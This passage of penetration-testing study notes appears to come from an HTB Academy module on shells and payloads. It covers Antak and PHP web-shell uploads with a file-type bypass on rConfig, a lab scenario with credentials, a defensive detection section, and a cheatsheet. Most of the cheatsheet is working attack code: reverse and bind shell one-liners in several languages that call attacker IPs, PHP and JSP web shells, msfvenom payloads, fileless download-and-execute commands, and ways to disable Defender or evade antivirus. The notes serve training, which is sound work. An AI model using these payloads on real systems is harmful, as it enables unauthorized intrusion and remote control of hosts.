if(Request.Params["user"] == "htb-student" && Request.Params["password"] == "HTB_@cademy_stdnt!")
```

**Why Set Credentials:**  
Unlike Laudanum, Antak uses a username/password login prompt when the shell page is accessed in the browser. Setting strong credentials prevents unauthorized users from accessing your shell during an engagement. Also remove ASCII art and comments before uploading to reduce detection risk. Add `/etc/hosts` entry for `status.inlanefreight.local` if testing against that host.

---

#### Shell Success

After uploading `Upload.aspx` via the target's file upload function and navigating to:
```
status.inlanefreight.local\\files\upload.aspx
```

A login form appears. Enter the configured credentials (`htb-student` / `HTB_@cademy_stdnt!`) and click Login.

---

#### Issuing Commands

Once logged in, the Antak shell interface appears — styled like a PowerShell console. Commands are issued in the input field and submitted. Available actions:

- **Submit** — executes the typed command
- **Browse / Upload the File** — uploads a file to the server
- **Encode and Execute** — base64-encodes and executes a command (helps bypass filtering)
- **Download** — downloads a file from the server
- **Parse web.config** — reads the web application's configuration file
- **Execute SQL Query** — runs SQL against a database using a connection string

Type `help` in the prompt to see available built-in commands and guidance for using the shell.

---

<a name="section-15"></a>
## Section 15 — PHP Web Shells

### PHP Overview

**PHP (Hypertext Preprocessor)** is an open-source, general-purpose scripting language widely used as part of web application stacks (LAMP — Linux, Apache, MySQL, PHP). As of the writing of this module (October 2021), PHP powers **78.6% of all websites** with a known server-side programming language (W3Techs). PHP processes code server-side — when a user submits a form (such as a login page), PHP handles the input and generates the response. Finding that a web server runs PHP tells us that a **PHP-based web shell** is a viable path to RCE on that server.

---

### Hands-on With a PHP-Based Web Shell

The target is the **rConfig 3.9.6** server running on CentOS with PHP. The vulnerability being exploited is rConfig's unrestricted file upload in the **Vendor Logo** upload field. The web shell used is **WhiteWinterWolf's PHP Web Shell** (a widely used, publicly available PHP shell). The challenge is that rConfig restricts uploads to image file types — this must be bypassed.

---

#### Bypassing the File Type Restriction

**Steps:**
1. Install and configure **Burp Suite** as a web proxy (set browser proxy to `127.0.0.1:8080`)
2. In rConfig, navigate to `Devices > Vendors > Add Vendor`
3. Click Browse in the **Vendor Logo** field and select the `.php` web shell file
4. Click Save — the request is intercepted by Burp Suite before reaching the server
5. In Burp Suite's interceptor, find the `Content-Type` header of the uploaded file
6. Change: `Content-Type: application/x-php` → `Content-Type: image/gif`
7. Forward the modified request twice in Burp to complete the upload
8. Turn off the Burp interceptor

**Why This Works:**  
The server checks `Content-Type` to validate the file type. By changing it from `application/x-php` to `image/gif`, we trick the server into accepting a `.php` file as if it were a GIF image. The file extension remains `.php`, so when we navigate to it, the web server executes it as PHP code.

---

#### Vendor Added

After the modified request is forwarded, the response confirms:

```
Added new vendor NetVen to Database
```

The vendor entry appears in the vendor list with a broken image icon (because the server couldn't render the PHP file as a valid image). This broken icon actually **confirms the PHP file was accepted** by the server. The file is now stored on the server and ready to be triggered.

---

#### Webshell Success

Navigate to the uploaded PHP shell in the browser:
```
/images/vendor/connect.php
```

The PHP web shell executes and presents a **browser-based command interface**. Commands can be typed in the input field and submitted. This provides non-interactive OS command execution on the underlying Linux system running the rConfig web server.

---

### Considerations when Dealing with Web Shells

Important limitations and risks to be aware of when using web shells:

- **Auto-deletion:** Some web applications delete uploaded files after a pre-defined time period — the shell may disappear
- **Limited interactivity:** Cannot navigate the file system, chain commands with `&&`, or use interactive tools as easily as a proper reverse shell
- **Non-interactive shell issues:** `whoami`, `ls` work, but interactive programs that need a TTY may fail
- **Instability:** Web shells depend on the web server staying up and the session staying alive
- **Evidence left behind:** Uploaded shell files are evidence of the attack — documents must be kept, including SHA1/MD5 hashes, upload locations, and payload names
- **Evasion concerns:** In black-box evasive assessments, establish a reverse shell and then delete the web shell payload to minimize evidence and improve stealth
- All methods attempted (successful and failed), file names, payload hashes, and upload paths must be documented in the penetration test report

---

<a name="section-16"></a>
## Section 16 — The Live Engagement

### Scenario

The learner acts as a penetration tester for **CAT5 Security**. CAT5 has already secured a foothold into the client network (**Inlanefreight**). The learner must now use all skills gained throughout the module to examine recon results, select appropriate exploits and payloads, and gain interactive shell sessions on multiple target hosts. All interactions with targets must be performed **from the provided foothold host** — not directly from the internet, as the targets are on an internal network segment (`172.16.0.0/23`).

---

### Objectives

1. **Windows Shell** — Exploit a Windows host/server and receive an interactive shell
2. **Linux Shell** — Exploit a Linux host/server and receive an interactive shell
3. **Web Application Shell** — Exploit a web application and receive an interactive browser-based or reverse shell
4. **Shell Identification** — Identify the shell environment available on the compromised victim host
5. **Complete challenge questions** — Answer all questions by extracting specific information from the target hosts

---

### Credentials and Other Needed Info

| Item | Value |
|---|---|
| **Foothold Username** | `htb-student` |
| **Foothold Password** | `HTB_@cademy_stdnt!` |
| **Foothold Access Method** | RDP |
| **Internal Network** | `172.16.0.0/23` |
| **Target IPs** | Provided when targets are spawned |

---

### Connectivity To The Foothold

**Command (to connect to foothold via RDP):**
```bash
xfreerdp /v:<target IP> /u:htb-student /p:HTB_@cademy_stdnt!
```

**What Each Part Does:**
- `xfreerdp` — the FreeRDP client for connecting to Windows Remote Desktop sessions from Linux
- `/v:<target IP>` — specifies the target IP (the foothold machine)
- `/u:htb-student` — the RDP username
- `/p:HTB_@cademy_stdnt!` — the RDP password

After running this command, an RDP login prompt appears. Enter the credentials again to connect. This opens a **Parrot Linux desktop** running on the foothold machine, with access to the internal `172.16.0.0/23` network where the three target hosts reside.

---

### Target Hosts

| Host | Address / Location |
|---|---|
| **Host-01** | `172.16.1.11:8080` |
| **Host-02** | `blog.inlanefreight.local` |
| **Host-03** | `172.16.1.13` |
| **Foothold** | IP provided when target is spawned |

Each host has a unique attack vector. Some hosts may have more than one way to gain access. All enumeration, exploitation, and listening must be performed **from the foothold machine**, since targets are only reachable from the internal network. Listeners on the foothold should use the **internal network IP** (`172.16.x.x`) — not the VPN IP.

---

<a name="section-17"></a>
## Section 17 — Detection & Prevention

### Overview

This section takes the **defensive perspective** — examining how active shells are detected, how payloads are identified on hosts and in network traffic, and how attackers obfuscate their techniques to bypass defenses. Understanding offensive techniques from both attacker and defender viewpoints makes for a more complete security professional. The MITRE ATT&CK Framework is the primary reference for categorizing the tactics and techniques covered in this module.

---

### Monitoring

The **MITRE ATT&CK Framework** is "a globally-accessible knowledge base of adversary tactics and techniques based on real-world observations." It maps attacker behaviour across an attack lifecycle into categories called Tactics and Techniques. Three ATT&CK tactics are most relevant to the content of this module:

---

#### Notable MITRE ATT&CK Tactics and Techniques

| Tactic / Technique | Description |
|---|---|
| **Initial Access** | Attackers compromise a public-facing host or service (web apps, misconfigured SMB, authentication protocols, or exploitable bugs). This establishes a foothold but not full internal access. Web applications are the primary initial access vector during external assessments. See OWASP Top Ten for common web vulnerabilities. |
| **Execution** | Code supplied by an attacker is run on the victim host. This module primarily covers this tactic: PowerShell one-liners via PsExec, publicly released exploits via Metasploit, file uploads triggering PHP shells, etc. All payloads and delivery methods explored in this module fall under Execution. |
| **Command & Control (C2)** | Once access is gained, C2 is the mechanism used to maintain continued interactive access and issue commands to compromised hosts. Can range from basic clear-text Netcat channels to encrypted protocols routed through proxies, VPNs, and redirectors. Common C2 channels use HTTP/S, DNS, NTP, or even legitimate applications (Slack, Teams, Discord). |

---

#### Events To Watch For

**File Uploads:**  
Pay attention to application logs for any uploaded files — especially to web servers. File upload is a primary initial access technique. Implement firewalls, AV scanning on uploads, and file type validation on the server side. Any internet-exposed host must be hardened and actively monitored for unusual file uploads.

**Suspicious Non-Admin User Actions:**  
Normal users running commands like `whoami`, `net user`, or connecting to unusual SMB shares is a significant indicator of compromise. Enabling logging for PowerShell commands, Bash history, and user shell interactions provides visibility into abnormal behavior. A user running shell commands they would never normally run is worth investigating immediately.

**Anomalous Network Sessions:**  
Users have predictable network behaviour — same sites, same applications, same times. NetFlow data analysis can reveal anomalies: top talkers, unusual destination ports (especially non-standard ports like `4444` — Meterpreter's default), bulk GET/POST requests in short time windows, or persistent heartbeat connections to external IPs. SIEM tools, firewall logs, and network monitors help bring order to network traffic analysis.

---

### Establish Network Visibility

Without comprehensive network visibility, detecting shell activity is nearly impossible. Good documentation and visual network topology diagrams (tools like Draw.io, Netbrain) help administrators understand the baseline of their network — what traffic is normal, which ports are in use, what devices communicate with what. Modern network vendors (Cisco Meraki, Palo Alto Networks, Ubiquiti, Check Point) build **Layer 7 visibility** (application-level traffic analysis) into their cloud-managed network devices. This allows admins to see not just IP/port but the actual **application and content** of traffic. Understanding the network baseline makes any deviation — like a shell payload communicating over an unusual port — immediately visible.

---

### Protecting End Devices

**End devices** are the source or destination of data on a network. They include:
- Workstations (employees' computers)
- Servers (providing network services)
- Printers, NAS, cameras, smart TVs, smart speakers

**Key Protection Measures:**
- **Anti-Virus** — Windows Defender should be enabled on all Windows systems (including servers). AV on servers can detect and block payload execution even if it impacts performance slightly.
- **Windows Defender Firewall** — Keep enabled for all profiles: Domain, Private, and Public. Only allow exceptions for approved applications through a formal change management process.
- **Patch Management** — Establish a process to apply Microsoft security updates shortly after release. EternalBlue is still exploitable on unpatched systems years after its patch was released.
- **Monitoring and Alerting** — Deploy endpoint monitoring to detect and alert on suspicious activities before they escalate into full breaches.

---

### Potential Mitigations

| Mitigation | Description |
|---|---|
| **Application Sandboxing** | Sandboxing internet-facing applications limits the scope of damage an attacker can cause if they exploit a vulnerability or misconfiguration. If the application is compromised, the attacker is contained within the sandbox. |
| **Least Privilege Permission Policies** | Users and services should only have the permissions necessary to perform their functions. Ordinary users should not have administrative rights. Reducing permissions limits what an attacker can do after gaining access to an account. |
| **Host Segmentation & Hardening** | Apply STIG hardening guides to all hosts. Place internet-facing servers (web servers, VPN servers) in a DMZ or quarantine network segment. Network segmentation prevents an attacker from pivoting from a compromised perimeter host into the internal network. |
| **Physical and Application Layer Firewalls** | Implement proper inbound and outbound rules: allow only traffic initiated from within your network, on approved ports, and deny inbound traffic from prohibited IPs. Firewalls with NAT and deep packet inspection can break shell payload functionality and detect/block both bind and reverse shells. |

---

### Sum It All Up

No single protection or mitigation is a complete defense against sophisticated attackers. A strong security posture requires a **defense-in-depth** approach — multiple overlapping layers of security controls so that if one layer is bypassed, others remain to detect and stop the attack. Key takeaways from this module's defensive perspective:

- **Network visibility** is essential — you cannot defend what you cannot see
- **Endpoint protection** (AV, patching, firewall) stops the most common attack vectors
- **Network monitoring** (NetFlow, SIEM, firewall logs) detects anomalous shell traffic
- **Least privilege and segmentation** limit the blast radius of a successful breach
- **Understanding attacker techniques** (from this module) directly improves defensive capabilities — the best defenders think like attackers

---

---

<a name="section-18"></a>
## Section 18 — Complete Cheatsheet

> Quick-reference for every command, shell type, payload, and technique covered in this module. Use this during labs and live engagements.

---

### Core Module Commands

| Command | Description |
|---|---|
| `xfreerdp /v:10.129.x.x /u:htb-student /p:HTB_@cademy_stdnt!` | Connect to a Windows target via RDP using the FreeRDP CLI client |
| `env` | Displays environment variables; look for `SHELL=` to identify the active interpreter |
| `sudo nc -lvnp <port>` | Start a Netcat listener (`-l` listen, `-v` verbose, `-n` no DNS, `-p` port) |
| `nc -nv <target_ip> <port>` | Connect to a Netcat listener at the specified IP and port |
| `Set-MpPreference -DisableRealtimeMonitoring $true` | PowerShell: disable Windows Defender real-time monitoring (admin required) |
| `use exploit/windows/smb/psexec` | Metasploit: Windows SMB PsExec authenticated code execution module |
| `shell` | Drop from a Meterpreter session into a native system shell |
| `msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > shell.elf` | Generate a Linux 64-bit stageless ELF reverse shell payload |
| `msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > shell.exe` | Generate a Windows 32-bit stageless EXE reverse shell payload |
| `msfvenom -p osx/x86/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f macho > shell.macho` | Generate a macOS reverse shell payload |
| `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.113 LPORT=443 -f asp > shell.asp` | Generate an ASP Meterpreter reverse shell (Windows IIS) |
| `msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f raw > shell.jsp` | Generate a JSP reverse shell for Java web servers |
| `msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f war > shell.war` | Generate a WAR-format reverse shell for Tomcat/JBoss deployment |
| `use auxiliary/scanner/smb/smb_ms17_010` | Metasploit: check if a host is vulnerable to EternalBlue (MS17-010) |
| `use exploit/windows/smb/ms17_010_psexec` | Metasploit: exploit EternalBlue to gain a reverse shell on a Windows host |
| `use exploit/linux/http/rconfig_vendors_auth_file_upload_rce` | Metasploit: RCE exploit for rConfig 3.9.6 on Linux |
| `python -c 'import pty; pty.spawn("/bin/sh")'` | Spawn a TTY shell using Python's pty module (Python 2) |
| `python3 -c 'import pty; pty.spawn("/bin/sh")'` | Spawn a TTY shell using Python's pty module (Python 3) |
| `/bin/sh -i` | Spawn an interactive Bourne shell directly |
| `perl -e 'exec "/bin/sh";'` | Spawn a shell using Perl's exec() |
| `ruby: exec "/bin/sh"` | Spawn a shell from inside a Ruby script |
| `lua: os.execute('/bin/sh')` | Spawn a shell from inside a Lua script |
| `awk 'BEGIN {system("/bin/sh")}'` | Spawn a shell using AWK's system() function |
| `find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;` | Use find + AWK to spawn a shell |
| `find . -exec /bin/sh \; -quit` | Spawn a shell directly using find's -exec flag |
| `vim -c ':!/bin/sh'` | Spawn a shell from within Vim |
| `ls -la <path/to/fileorbinary>` | List file permissions — check for SUID/SGID bits on binaries |
| `sudo -l` | List commands the current user may run as sudo |
| `/usr/share/webshells/laudanum` | Location of Laudanum web shells on Parrot OS and Pwnbox |
| `/usr/share/nishang/Antak-WebShell` | Location of the Antak ASPX web shell on Parrot OS and Pwnbox |

---

### Reverse Shells — One-Liners by Language

> **Always start a listener on the attack box first:**
> ```bash
> sudo nc -lvnp 443
> ```

#### Bash Reverse Shell

```bash
bash -i >& /dev/tcp/10.10.14.12/443 0>&1
```

| Part | Explanation |
|---|---|
| `bash -i` | Start an interactive Bash shell |
| `>& /dev/tcp/10.10.14.12/443` | Redirect stdout AND stderr to a TCP socket to the attacker on port 443 |
| `0>&1` | Redirect stdin to the same TCP socket (attacker can type commands) |

---

#### Netcat / Bash Reverse Shell (Named Pipe Method)

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.12 7777 > /tmp/f
```

| Part | Explanation |
|---|---|
| `rm -f /tmp/f` | Remove `/tmp/f` if it already exists (`-f` suppresses errors) |
| `mkfifo /tmp/f` | Create a FIFO named pipe at `/tmp/f` |
| `cat /tmp/f \|` | Read from the pipe and pipe its output into Bash |
| `/bin/bash -i 2>&1 \|` | Start interactive Bash; redirect stderr to stdout |
| `nc 10.10.14.12 7777` | Connect back to the attacker's Netcat listener on port 7777 |
| `> /tmp/f` | Feed Netcat's received data back into the named pipe (closes the loop) |

---

#### Python Reverse Shell

```bash
python3 -c 'import socket,subprocess,os; s=socket.socket(); s.connect(("10.10.14.12",443)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call(["/bin/bash","-i"])'
```

Creates a TCP socket, connects to the attacker, duplicates the socket file descriptor to stdin (0), stdout (1), stderr (2), then launches `/bin/bash -i` so all I/O flows over the network.

---

#### Perl Reverse Shell

```bash
perl -e 'use Socket; $i="10.10.14.12"; $p=443; socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp")); if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S"); open(STDOUT,">&S"); open(STDERR,">&S"); exec("/bin/bash -i");};'
```

Uses Perl's `Socket` module to open a TCP connection, then redirects stdin/stdout/stderr to the socket and executes Bash. Available on most Linux systems.

---

#### Ruby Reverse Shell

```bash
ruby -rsocket -e'f=TCPSocket.open("10.10.14.12",443).to_i; exec sprintf("/bin/bash -i <&%d >&%d 2>&%d",f,f,f)'
```

Uses Ruby's built-in `TCPSocket` to connect to the attacker. `sprintf` builds the shell command with the socket file descriptor used for all three I/O streams.

---

#### AWK Reverse Shell

```bash
awk 'BEGIN{s="/inet/tcp/0/10.10.14.12/443";for(;s|&getline c;close(c))while(c|getline)print|&s;close(s)}'
```

Uses AWK's built-in TCP networking via `/inet/tcp/`. Reads commands from the socket using `getline` and executes them, sending output back. AWK is present on virtually all Unix/Linux systems.

---

#### PowerShell Reverse Shell One-Liner (Windows)

```cmd
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

| Part | Explanation |
|---|---|
| `powershell -nop -c` | Run PowerShell with no profile; execute the command block that follows |
| `New-Object System.Net.Sockets.TCPClient(...)` | Create a TCP connection to the attacker's IP and port |
| `$stream = $client.GetStream()` | Get the bidirectional network stream |
| `[byte[]]$bytes = 0..65535\|%{0}` | Create a 64 KB empty byte buffer for reading commands |
| `iex $data 2>&1` | Execute received commands with `Invoke-Expression`; capture stderr too |
| `$sendback2 + 'PS ' + (pwd).Path + '> '` | Build a PowerShell-style prompt showing the current directory |
| `$stream.Write(...); $stream.Flush()` | Send the command output back over the TCP stream |

---

### Bind Shells — One-Liners

> Run on the **target** first, then connect from the **attacker**:
> ```bash
> nc -nv <target_ip> <port>
> ```

#### Netcat Bind Shell (Linux — Named Pipe)

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 0.0.0.0 4444 > /tmp/f
```

Same named-pipe technique as the reverse shell, but `nc -l` makes the target **listen** for an incoming connection instead of connecting out.

---

#### Python Bind Shell

```python
python3 -c 'import socket,subprocess,os; s=socket.socket(); s.bind(("0.0.0.0",4444)); s.listen(1); conn,addr=s.accept(); os.dup2(conn.fileno(),0); os.dup2(conn.fileno(),1); os.dup2(conn.fileno(),2); subprocess.call(["/bin/bash","-i"])'
```

Binds a TCP socket to port 4444 on all interfaces. Waits for the attacker to connect, then bridges the socket to a Bash shell's stdin/stdout/stderr.

---

#### PowerShell Bind Shell (Windows)

```powershell
$listener = [System.Net.Sockets.TcpListener]4444; $listener.Start(); $client = $listener.AcceptTcpClient(); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){ $data = (New-Object System.Text.ASCIIEncoding).GetString($bytes,0,$i); $out = (iex $data 2>&1 | Out-String); $out2 = $out + "PS "+(pwd).Path+"> "; $send = ([text.encoding]::ASCII).GetBytes($out2); $stream.Write($send,0,$send.Length); $stream.Flush() }; $client.Close(); $listener.Stop()
```

Creates a TCP listener on port 4444. When the attacker connects, it reads commands, executes them with `Invoke-Expression`, and returns the output — giving a full PowerShell session over the bind connection.

---

### Web Shells

#### PHP — Minimal (GET parameter)

```php
<?php system($_GET['cmd']); ?>
```

**Usage:** `http://target.com/shell.php?cmd=whoami`

`system()` executes the OS command from the `cmd` GET parameter and prints the full output directly to the browser response.

---

#### PHP — Using exec()

```php
<?php echo exec($_GET['cmd']); ?>
```

`exec()` returns only the **last line** of command output. Less visible in output but sometimes less detected by WAFs than `system()`.

---

#### PHP — Using passthru()

```php
<?php passthru($_GET['cmd']); ?>
```

`passthru()` sends the **raw binary output** directly to the browser with no buffering or encoding. Best for commands that return binary data or special characters.

---

#### PHP — Using shell_exec()

```php
<?php echo shell_exec($_GET['cmd']); ?>
```

`shell_exec()` runs the command through the shell and returns the **entire output** as a string (unlike `exec()` which only returns the last line). Equivalent to backtick syntax.

---

#### PHP — Full Web Shell with HTML Form

```php
<?php
if(isset($_REQUEST['cmd'])){
    echo "<pre>" . htmlspecialchars(shell_exec($_REQUEST['cmd'])) . "</pre>";
}
?>
<form method="POST">
  <input type="text" name="cmd" size="60" placeholder="Enter command...">
  <input type="submit" value="Execute">
</form>
```

`$_REQUEST` accepts both GET and POST. `htmlspecialchars()` prevents browser misinterpreting output as HTML. `<pre>` preserves whitespace and newlines in the output.

---

#### PHP — Reverse Shell via exec()

```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.12/443 0>&1'"); ?>
```

When the PHP file is loaded in a browser, `exec()` triggers a Bash reverse shell that connects back to the attacker's Netcat listener automatically.

---

#### PHP — Bind Shell

```php
<?php
$port = 4444;
$sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
socket_bind($sock, '0.0.0.0', $port);
socket_listen($sock);
$conn = socket_accept($sock);
$shell = proc_open('/bin/bash -i', [0=>['pipe','r'],1=>['pipe','w'],2=>['pipe','w']], $pipes);
stream_set_blocking($pipes[0], false);
stream_set_blocking($pipes[1], false);
socket_set_nonblock($conn);
while(!feof($pipes[1])){
    $r = @socket_read($conn, 2048);
    if($r !== '' && $r !== false) fwrite($pipes[0], $r);
    $o = fgets($pipes[1]);
    if($o !== false) socket_write($conn, $o);
}
fclose($pipes[0]); fclose($pipes[1]); fclose($pipes[2]);
proc_close($shell); socket_close($conn); socket_close($sock);
?>
```

When the PHP page is requested, the server **listens on port 4444**. The attacker connects with `nc -nv <target_ip> 4444` and receives a full Bash shell. The socket bridges I/O between the network connection and the Bash process.

---

#### PHP — Multi-Function Bypass Shell (disable_functions workaround)

```php
<?php
function run($cmd){
    if(function_exists('system')){ ob_start(); system($cmd); return ob_get_clean(); }
    elseif(function_exists('passthru')){ ob_start(); passthru($cmd); return ob_get_clean(); }
    elseif(function_exists('shell_exec')){ return shell_exec($cmd); }
    elseif(function_exists('exec')){ exec($cmd,$o); return implode("\n",$o); }
    elseif(function_exists('popen')){ $f=popen($cmd,'r'); $o=''; while(!feof($f)) $o.=fgets($f,4096); pclose($f); return $o; }
    return "No execution function available.";
}
echo "<pre>" . htmlspecialchars(run($_GET['cmd'])) . "</pre>";
?>
```

Tries `system()` → `passthru()` → `shell_exec()` → `exec()` → `popen()` in order. Useful when some functions are blocked in `php.ini` via `disable_functions`. Falls through to the next available function automatically.

---

#### JSP Web Shell (Java Servers — Tomcat, JBoss)

```jsp
<%@ page import="java.util.*,java.io.*"%>
<%
String cmd = request.getParameter("cmd");
if(cmd != null){
    Process p = Runtime.getRuntime().exec(cmd);
    DataInputStream dis = new DataInputStream(p.getInputStream());
    String line = dis.readLine();
    while(line != null){ out.println(line); line = dis.readLine(); }
}
%>
<form><input name="cmd"><input type="submit" value="Run"></form>
```

**Usage:** `http://target.com/shell.jsp?cmd=whoami`

Uses `Runtime.getRuntime().exec()` to run OS commands. Reads and prints output line by line. Upload to a Java web server (Tomcat webapps directory, JBoss deploy, etc.).

---

#### ASPX Web Shell Locations (Laudanum & Antak)

```bash
# Copy Laudanum ASPX shell and add attacker IP on line 59
cp /usr/share/laudanum/aspx/shell.aspx /home/tester/demo.aspx
# Edit: string[] allowedIps = new string[] { "10.10.14.12" };

# Copy Antak and set username + password on line 14
cp /usr/share/nishang/Antak-WebShell/antak.aspx /home/administrator/Upload.aspx
# Edit: if(Request.Params["user"]=="htb-student" && Request.Params["password"]=="HTB_@cademy_stdnt!")
```

Remove ASCII art and comments from both files before uploading to reduce AV/IDS signature detection.

---

### MSFvenom Flag Reference

| Flag | Description |
|---|---|
| `-p <payload>` | Payload to generate (e.g., `linux/x64/shell_reverse_tcp`) |
| `LHOST=<ip>` | Attacker's IP address for the reverse shell callback |
| `LPORT=<port>` | Attacker's listening port |
| `-f <format>` | Output format: `elf`, `exe`, `macho`, `asp`, `aspx`, `php`, `raw`, `war`, `jar`, `py` |
| `-e <encoder>` | Encoder to use (e.g., `x86/shikata_ga_nai` to evade AV) |
| `-i <count>` | Number of encoding iterations |
| `-o <filename>` | Output filename |
| `-b '<chars>'` | Bad characters to exclude from the payload |

#### Staged vs. Stageless — Naming Convention

| Name | Type | How to Tell |
|---|---|---|
| `linux/x86/shell/reverse_tcp` | **Staged** | Slashes separate stages: `/shell/` then `/reverse_tcp` |
| `linux/x86/shell_reverse_tcp` | **Stageless** | Underscore connects: `shell_reverse_tcp` as one unit |
| `windows/meterpreter/reverse_tcp` | **Staged** | `/meterpreter/` and `/reverse_tcp` are separate stages |
| `windows/meterpreter_reverse_tcp` | **Stageless** | `meterpreter_reverse_tcp` combined into one segment |

---

### Metasploit Quick Reference

| Command | Description |
|---|---|
| `sudo msfconsole` | Launch the Metasploit Framework console as root |
| `search <keyword>` | Search modules (e.g., `search smb`, `search eternal`, `search rconfig`) |
| `use <module_path>` | Select a module (e.g., `use exploit/windows/smb/psexec`) |
| `options` | Show all configurable options for the current module |
| `set <OPTION> <value>` | Set an option (e.g., `set RHOSTS 10.129.180.71`) |
| `show options` | Verify all current option values before running |
| `exploit` | Execute the selected module |
| `getuid` | Show the current user on the target (inside Meterpreter) |
| `shell` | Drop from Meterpreter into a native CMD or Bash shell |
| `?` | List all available Meterpreter commands |

---

### Interactive Shell Spawning — Quick Reference Table

| Method | Command | Requirement |
|---|---|---|
| Python 2 | `python -c 'import pty; pty.spawn("/bin/sh")'` | Python 2 installed |
| Python 3 | `python3 -c 'import pty; pty.spawn("/bin/sh")'` | Python 3 installed |
| /bin/sh | `/bin/sh -i` | Always available |
| Bash | `/bin/bash -i` | Bash installed |
| Perl | `perl -e 'exec "/bin/sh";'` | Perl installed |
| Ruby | `ruby: exec "/bin/sh"` | Ruby installed (from script) |
| Lua | `lua: os.execute('/bin/sh')` | Lua installed (from script) |
| AWK | `awk 'BEGIN {system("/bin/sh")}'` | AWK (almost always present) |
| Find + AWK | `find / -name f -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;` | find + AWK |
| Find exec | `find . -exec /bin/sh \; -quit` | find |
| Vim | `vim -c ':!/bin/sh'` | Vim installed |
| Vim escape | `vim` → `:set shell=/bin/sh` → `:shell` | Vim installed |

---

### Windows CMD Reference

```cmd
whoami                          # Current user
hostname                        # Machine name
systeminfo                      # Full OS and hardware info
net users                       # List all local users
net localgroup administrators   # Members of Administrators group
ipconfig /all                   # Full network configuration
netstat -ano                    # Active connections with PIDs
tasklist                        # Running processes
dir                             # List current directory
dir /s /b *.txt                 # Recursive search for .txt files
type <filename>                 # Print file contents
copy <src> <dst>                # Copy a file
del <filename>                  # Delete a file
mkdir <dirname>                 # Create a directory
```

---

### PowerShell Reference

```powershell
Get-Process                                  # List processes
Get-Service                                  # List services
Get-LocalUser                                # List local users
Get-LocalGroupMember Administrators          # List admin group members
Get-NetIPAddress                             # Show IP addresses
Set-MpPreference -DisableRealtimeMonitoring $true   # Disable Defender

# Download a file to disk
Invoke-WebRequest -Uri "http://10.10.14.12/shell.exe" -OutFile "C:\Windows\Temp\shell.exe"

# Download and execute a PowerShell script in memory (fileless)
IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.12/payload.ps1')

# Execute PowerShell bypassing execution policy
powershell -ExecutionPolicy Bypass -File script.ps1

# Execute base64-encoded command (evades some filters)
powershell -enc <base64_encoded_command>
```

---

### Nishang — Invoke-PowerShellTcp

**File location:**
```
/usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1
```

**Reverse shell (run on Windows target):**
```powershell
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.12 -Port 443
```

**Bind shell (run on Windows target):**
```powershell
Invoke-PowerShellTcp -Bind -Port 4444
```

**Download and execute in memory (fileless):**
```powershell
IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.12/Invoke-PowerShellTcp.ps1'); Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.12 -Port 443
```

---

### Web Shell File Locations on Parrot OS / Kali / Pwnbox

| Path | Contents |
|---|---|
| `/usr/share/webshells/` | Root directory of pre-installed web shells |
| `/usr/share/webshells/php/` | PHP web shells |
| `/usr/share/webshells/aspx/` | ASP.NET web shells |
| `/usr/share/webshells/jsp/` | JSP web shells |
| `/usr/share/laudanum/` | Laudanum web shell repository |
| `/usr/share/laudanum/aspx/shell.aspx` | Laudanum ASPX shell — edit `allowedIps` on line 59 |
| `/usr/share/laudanum/php/` | Laudanum PHP shells |
| `/usr/share/laudanum/jsp/` | Laudanum JSP shells |
| `/usr/share/nishang/Antak-WebShell/antak.aspx` | Antak PowerShell ASPX shell — edit credentials on line 14 |
| `/usr/share/nishang/Shells/` | Nishang reverse/bind PowerShell shell scripts |

---

*End of Shells & Payloads — HTB Academy Structured Notes*

> **Sections covered:** 1 through 18 | **Total sections:** 18/18 | All headings, subheadings, commands, steps, and cheatsheet content preserved.
